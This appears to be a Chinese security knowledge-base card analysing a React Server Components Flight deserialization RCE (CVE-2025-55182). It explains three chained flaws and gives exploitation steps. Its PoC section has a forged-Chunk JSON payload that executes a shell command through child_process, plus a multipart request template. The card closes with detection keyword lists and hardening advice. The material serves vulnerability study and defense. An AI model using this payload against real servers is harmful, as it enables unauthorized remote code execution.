---
id: web-nodejs-deserialization-react-flight-chunk-proto-function-rce
title: React Server Components Flight 协议反序列化链 RCE（CVE-2025-55182 React2Shell）
type: scenario
domain: web
path: web/nodejs/deserialization
technique: react-flight-chunk-proto-function-chain
aliases:
- CVE-2025-55182
- React2Shell
- React Flight 反序列化
- Chunk 原型链路径遍历
- $B Blob 分支 Function 构造器
- Next.js RSC RCE
tags:
- nodejs
- react
- nextjs
- flight-protocol
- deserialization
- prototype-chain
- function-constructor
- rce
- cve-2025-55182
cve:
- CVE-2025-55182
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T09:02:27+08:00'
  notes: 已通读原文（无图片）并核对：CVE-2025-55182/React2Shell 标题一致；三处缺陷（getOutlinedModel 路径引用可走__proto__/constructor、Chunk.then 仅凭status字符串进入initializeModelChunk且信任伪造_response、$B分支调用可被替换的_formData.get）及 FormData 三字段构造（then=$1:__proto__:then、status=resolved_model、value={"then":"$B1337"}、_formData.get=$1:constructor:constructor、$@0、[]）均与原文一致。未验证点：原文为代码层原理分析，无 HTTP 请求/响应/命令回显，代码片段为节选/伪代码，Function 创建后的调用时机需按真实版本验证；原文未标注受影响版本区间，未设 affected_versions；frontmatter无source_url；未本机复跑。同 CVE 的 decodeAction 向量另有已验证卡。
---

## 一句话结论

React Server Components 的 Flight 协议在服务端解析客户端提交的 Chunk/路径引用时存在三处链式缺陷：路径引用可遍历 `__proto__`/`constructor` 窃取函数、伪造的 Chunk 仅凭 `status` 就被当作合法 Chunk 初始化、`$B` Blob 分支把可被替换的 `_formData.get` 当函数调用；三者组合可在 Node.js 服务端动态构造并执行任意函数体，形成 RCE（CVE-2025-55182，React2Shell）。

## 原理

- **背景**：Flight 协议用 `Chunk` 封装数据并让 `Chunk.prototype = Object.create(Promise.prototype)`，使 Chunk 成为可被 Promise 链处理的 thenable；`Chunk.prototype.then()` 在 `status === 'resolved_model'` 时调用 `initializeModelChunk(chunk)` 做反序列化。客户端提交的 FormData 会被解析成 Chunk 引用（`$<id>:<path>`、`$B<hex>` 等）。
- **缺陷 1：路径引用遍历原型链**：`getOutlinedModel(response, reference, ...)` 把 `reference.split(':')` 后的每一段直接用 `value = value[path[i]]` 取值，未阻止 `__proto__`、`constructor`、`prototype`，也未用 `hasOwnProperty` 限制自身属性。攻击者可用 `$1:__proto__:then` 之类的路径从对象原型/构造器链上取到真实函数（原文示例取 `Chunk.prototype.then`），把它塞进伪造对象，使伪造对象成为“合法” thenable。
- **缺陷 2：伪造 Chunk/Response 无实例校验**：`Chunk.prototype.then` 对 `this` 只检查 `status` 字符串，`initializeModelChunk` 直接读 `chunk.value` 并 `JSON.parse`，再把 `chunk._response` 当合法 Response 使用；没有 `instanceof Chunk`、`instanceof Response` 校验。攻击者因此可以提交一个普通 JSON 对象，伪装成 `{"status":"resolved_model","value":"<内层 JSON>","_response":{...}}`，迫使服务端按 Chunk 逻辑处理攻击者提供的 `_response`。
- **缺陷 3：`$B` 分支调用可替换的 `_formData.get`**：解析 `$B<hex>` 时执行 `const blobKey = response._prefix + id; const backingEntry = response._formData.get(blobKey);`。若 `_formData.get` 被路径引用替换为 `Function`（如 `$1:constructor:constructor` 得到 `Object.constructor.constructor`），则 `Function(prefix + id)` 会用攻击者拼接的字符串作为函数体创建函数；当该函数作为 thenable/then 回调被 Promise 机制调用时，函数体执行，达成任意代码执行。
- **原文给出的利用构造**：multipart FormData 三个字段——field 0 为主 payload（伪造 Chunk，`then` 指向 `$1:__proto__:then`，`status=resolved_model`，`value` 为 `{"then":"$B1337"}`，`_response._prefix` 为恶意代码，`_response._formData.get` 为 `$1:constructor:constructor`）；field 1 为 `$@0`（循环引用）；field 2 为 `[]`。服务端 `getRoot(response)` 后调用 `rootChunk.then()`，依次触发三个缺陷。
- **成立条件与边界**：Flight 解析器必须接受上述类型/路径语法；目标为受影响 React Server Components/Next.js 版本（原文未标注具体版本区间）。原文是代码层分析，代码片段为节选/伪代码，且未附实际 HTTP 请求与命令回显，部分细节（如 Function 创建后的调用时机）需按真实版本验证，故 confidence 定为 medium。

## 触发条件

- 目标使用受影响版本的 React Server Components / Next.js，并暴露 Flight 协议入口（Server Actions/`POST /page` 等接受 multipart Flight 数据的路由）。
- 服务端 Flight 解析器存在上述三处缺陷（路径引用未限制危险属性、Chunk/Response 无实例校验、`$B` 分支信任 `_formData.get`）。
- 攻击者可向该入口提交任意 multipart FormData 字段，且服务端会解析并触发根 Chunk 的 `then()`。
- 目标 Node.js 进程可执行 `child_process`/`process.mainModule` 等（默认具备）；无 WAF 拦截 `__proto__`、`constructor`、`$B`、`$@` 等 Flight 特征。

## 利用步骤

1. 确认目标为 React Server Components/Next.js 应用，找到接受 Flight 数据的 Server Action 或 `POST /page` 入口。
2. 构造 multipart FormData 三个字段：
   - field 0：伪造 Chunk JSON，包含 `then`、`status`、`value`、`_response`；
   - field 1：`"$@0"`，让根 Chunk 引用 field 0；
   - field 2：`[]`，满足 `_chunks` 结构。
3. 在 `_response._prefix` 中放入要执行的 JS 代码（如 `process.mainModule.require('child_process').execSync('id')`）。
4. 用 `$1:__proto__:then` 让伪造对象获得真实 `then`；用 `$1:constructor:constructor` 让 `_formData.get` 变成 `Function`。
5. 发送请求，服务端解析 `$B1337` 时用 `Function(prefix+id)` 构造恶意函数并在 then 链中执行，命令结果可按原语外带/回显。

## PoC

原文未给出可直接执行的 HTTP 报文与命令回显，只给出 FormData 构造思路。核心字段（原文结构）：

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "process.mainModule.require('child_process').execSync('id').toString().trim();",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}
```

请求形态（按原文描述）：

```http
POST /page HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="0"

<上面的伪造 Chunk JSON>
------boundary
Content-Disposition: form-data; name="1"

"$@0"
------boundary
Content-Disposition: form-data; name="2"

[]
------boundary--
```

触发路径：`getRoot(response)` → `rootChunk.then()` → 缺陷 1 取 `then` → 缺陷 2 进入 `initializeModelChunk` 并使用伪造 `_response` → 解析 `$B1337` 时 `_formData.get` 已是 `Function` → `Function(prefix+id)` 构造恶意函数体 → Promise 链调用执行。

## 变体与关联

- **路径引用变体**：`$1:constructor:constructor`、`$1:__proto__:then` 之外，任何能到达 `Function`/危险 getter 的原型链路径都可用于同一目的；修复需同时阻止 `__proto__`/`constructor`/`prototype` 与原型链读取。
- **协议分支变体**：`$B`（Blob）之外，其他会调用 `_formData`/`_response` 方法的引用类型也可能被滥用；审计重点是“用户可控字符串被当函数/方法调用”。
- **利用目标**：Node.js 服务端的 `process.mainModule.require('child_process').execSync(...)`；在 ESM/受限环境可换 `globalThis.process`、`import()`、`require` 缓存等。
- **关联**：Node.js 反序列化（node-serialize、Qwik QRL）、原型链污染、Server Actions/Flight 协议解析类漏洞；共同根因是“协议数据被当作带方法的可信对象”。
- **修复对照**：原文列出三处修复——属性白名单 + `hasOwnProperty`、`instanceof Chunk/Response` 校验、`instanceof FormData` + `formData.get === FormData.prototype.get`。实际修复以官方补丁为准。

## 检测与防御

- **升级**：升级 React Server Components/Next.js 到修复版本（原文未标注版本区间，以官方公告为准）；无法升级时禁用不必要的 Server Actions/RSC 入口。
- **输入检测**：multipart/JSON 中出现 `__proto__`、`constructor`、`prototype`、`$1:`、`$@`、`$B`、`resolved_model`、`_formData`、`_prefix` 等 Flight 特征；同一请求包含伪造 Chunk 的 `then`/`status`/`_response` 组合；WAF 应对 Flight 解码后的内容检测。
- **运行时检测**：Node 进程异常派生 `sh`/`id`/`curl` 子进程；`child_process.execSync`/`spawn` 调用栈来自 Flight 解析；请求体中出现 `Function` 构造器可达的原型链路径。
- **加固**：限制 Node 服务出站与命令执行能力（最小权限、容器只读、seccomp）；对 Flight 解析器做模糊测试与安全审计；对 `response._formData`/`_response` 强制实例校验（修复根因），不要仅靠关键字黑名单。
